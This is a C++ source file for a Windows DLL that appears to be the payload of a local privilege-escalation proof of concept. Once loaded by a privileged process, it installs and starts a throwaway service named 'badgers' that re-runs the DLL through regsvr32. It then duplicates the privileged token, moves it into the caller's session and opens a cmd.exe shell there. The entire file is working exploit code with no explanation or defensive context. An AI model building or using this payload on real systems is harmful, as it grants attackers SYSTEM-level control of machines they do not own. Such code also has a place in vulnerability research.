// FakeDll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <winternl.h>
#include <TlHelp32.h>
#include <strsafe.h>
#include <stdlib.h>

class ScopedHandle
{
 public:
	 explicit ScopedHandle(HANDLE h) { _h = h; }
	 ScopedHandle() : _h(nullptr) {}
	 ~ScopedHandle() {
		 if (valid()) {
			 CloseHandle(_h);
			 _h = nullptr;
		 }
	 }

	 PHANDLE ptr() {
		 return &_h;
	 }

	 HANDLE get() {
		 return _h;
	 }

	 bool valid() {
		 return _h != nullptr && _h != INVALID_HANDLE_VALUE;
	 }

private:
	HANDLE _h;
};

class ScopedServiceHandle
{
public:
	explicit ScopedServiceHandle(SC_HANDLE h) { _h = h; }
	ScopedServiceHandle() : _h(nullptr) {}
	~ScopedServiceHandle() {
		if (valid()) {
			CloseServiceHandle(_h);
			_h = nullptr;
		}
	}

	SC_HANDLE* ptr() {
		return &_h;
	}

	SC_HANDLE get() {
		return _h;
	}

	bool valid() {
		return _h != nullptr;
	}

private:
	SC_HANDLE _h;
};


DWORD GetServicesPid()
{
	ScopedHandle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
	if (!snapshot.valid())
	{
		OutputDebugString(L"Error opening process snapshot\n");
		return E_FAIL;
	}

	PROCESSENTRY32 proc = {};
	proc.dwSize = sizeof(proc);
	if (Process32First(snapshot.get(), &proc))
	{
		do
		{
			if (_wcsicmp(proc.szExeFile, L"services.exe") == 0)
			{
				return proc.th32ProcessID;
				break;
			}
			proc.dwSize = sizeof(proc);
		} while (Process32Next(snapshot.get(), &proc));
	}
	return 0;
}

DWORD GetCallerSessionId()
{
	if (FAILED(CoImpersonateClient()))
	{
		OutputDebugString(L"Couldn't impersonate caller\n");
		return 0;
	}

	ScopedHandle token;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, token.ptr()))
	{
		RevertToSelf();
		OutputDebugString(L"Couldn't open thread token\n");
		return 0;
	}
	RevertToSelf();

	DWORD session_id;
	DWORD ret_length;
	if (!GetTokenInformation(token.get(), TokenSessionId, &session_id, sizeof(session_id), &ret_length))
	{
		OutputDebugString(L"Couldn't get session id\n");
		return 0;
	}

	return session_id;
}

extern HMODULE g_module;

void CreateAndStartService()
{
	DWORD session_id = GetCallerSessionId();
	WCHAR path[MAX_PATH];
	GetModuleFileName(g_module, path, MAX_PATH);

	WCHAR cmdline[1024];

	StringCchPrintf(cmdline, 1024, L"regsvr32 /s /i:%d %ls", session_id, path);
	
	ScopedServiceHandle scm(OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT));
	if (!scm.valid())
	{
		OutputDebugString(L"Couldn't get open SCM\n");
		return;
	}

	ScopedServiceHandle service(CreateService(scm.get(), L"badgers", L"", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, cmdline, nullptr, nullptr, nullptr, nullptr, nullptr));
	if (!service.valid())
	{
		OutputDebugString(L"Couldn't create service");
		return;
	}

	if (!StartService(service.get(), 0, nullptr))
	{
		OutputDebugString(L"Failed to start service");
	}

	DWORD result = WaitServiceState(service.get(), 
		SERVICE_NOTIFY_STOPPED, INFINITE, nullptr);
	DeleteService(service.get());
}

HRESULT __stdcall DllGetClassObject(
	_In_  REFCLSID rclsid,
	_In_  REFIID   riid,
	_Out_ LPVOID   *ppv
) 
{
	CreateAndStartService();
	return E_FAIL;
}

HRESULT __stdcall DllRegisterServer()
{
	return S_OK;
}

HRESULT __stdcall DllInstall(BOOL bInstall, PCWSTR pszCmdLine) 
{
	ScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
	{
		OutputDebugString(L"Couldn't open process token\n");
		return E_FAIL;
	}

	ScopedHandle dup_token;
	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, dup_token.ptr()))
	{
		OutputDebugString(L"Couldn't duplicate process token\n");
		return E_FAIL;
	}

	OutputDebugStringW(pszCmdLine);

	DWORD session_id = wcstoul(pszCmdLine, nullptr, 0);
	if (!SetTokenInformation(dup_token.get(), TokenSessionId, &session_id, sizeof(session_id)))
	{
		OutputDebugString(L"Couldn't set token session ID\n");
		return E_FAIL;
	}

	PROCESS_INFORMATION proc_info = {};
	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = L"WinSta0\\Default";
	WCHAR cmdline[] = L"C:\\Windows\\System32\\cmd.exe";

	if (!CreateProcessAsUser(dup_token.get(), nullptr, cmdline, nullptr,
		nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		WCHAR buf[256];
		StringCchPrintf(buf, 256, L"Couldn't create process %d\n", GetLastError());
		OutputDebugString(buf);
		return E_FAIL;
	}

	return S_OK;
}